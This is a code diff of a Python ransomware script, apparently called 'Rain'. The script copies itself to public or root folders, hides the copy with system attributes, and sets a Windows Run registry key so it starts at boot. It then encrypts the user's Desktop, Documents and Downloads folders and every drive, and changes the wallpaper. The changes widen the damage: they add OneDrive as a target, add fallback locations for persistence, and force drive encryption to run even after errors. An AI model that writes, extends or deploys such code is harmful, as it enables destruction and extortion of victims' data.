@@ -341,11 +341,12 @@ for letter in list(ascii_uppercase):
 
 # Instantiate the Crypt class
 
-crypto = Crypt(passwd, exts, 'Rain', img)
+crypto = Crypt(passwd, exts, img)
 
 desktop = expanduser('~/Desktop')
 documents = expanduser('~/Documents')
 downloads = expanduser('~/Downloads')
+onedrive = expanduser('~/OneDrive')
 appdata = getenv('APPDATA')
 
 """ Save the main file to the users public folder, 
@@ -353,9 +354,18 @@ appdata = getenv('APPDATA')
     and add a registry to run with system boot
 """
 
-dst = r'C:\Users\Public\{}'.format(__file__)
-copyfile(__file__, dst)
-system('attrib +s +h {}'.format(dst))
+try:
+    dst = r'C:\Users\Public\{}'.format(__file__)
+    copyfile(__file__, dst)
+    system('attrib +s +h {}'.format(dst))
+except PermissionError:
+    try:
+        dst = r'C:\{}'.format(__file__)
+        copyfile(__file__, dst)
+        system('attrib +s +h {}'.format(dst))
+    except PermissionError:
+        dst = __file__
+        system('attrib +s +h {}'.format(dst))
 
 crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"', 'Rain')
 
@@ -364,6 +374,7 @@ crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst 
 crypto.crypt_directory(desktop)
 crypto.crypt_directory(documents)
 crypto.crypt_directory(downloads)
+crypto.crypt_directory(onedrive)
 
 crypto.change_background(appdata)
 
@@ -374,8 +385,9 @@ crypto.change_background(appdata)
 for drive in drives:
     try:
         chdir(drive + '/')
-        crypto.crypt_directory(drive)
     except FileNotFoundError:
         continue
     except PermissionError:
         continue
+    finally:
+        crypto.crypt_directory(drive)
